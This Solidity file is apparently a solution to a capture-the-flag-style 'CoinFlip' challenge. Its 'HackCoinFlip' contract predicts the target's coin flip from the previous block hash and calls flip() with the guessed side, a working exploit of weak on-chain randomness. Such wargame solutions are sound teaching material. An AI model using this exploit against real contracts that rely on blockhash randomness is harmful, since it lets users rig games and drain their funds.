// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "./CoinFlip.sol";

contract HackCoinFlip {
    CoinFlip coinFlip;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlip) {
        coinFlip = _coinFlip;
    }

    function tryFlip() external {
        coinFlip.flip(guess());
    }

    function guess() internal view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 flip = blockValue / FACTOR;

        bool side = flip == 1 ? true : false;
        return side;
    }
}
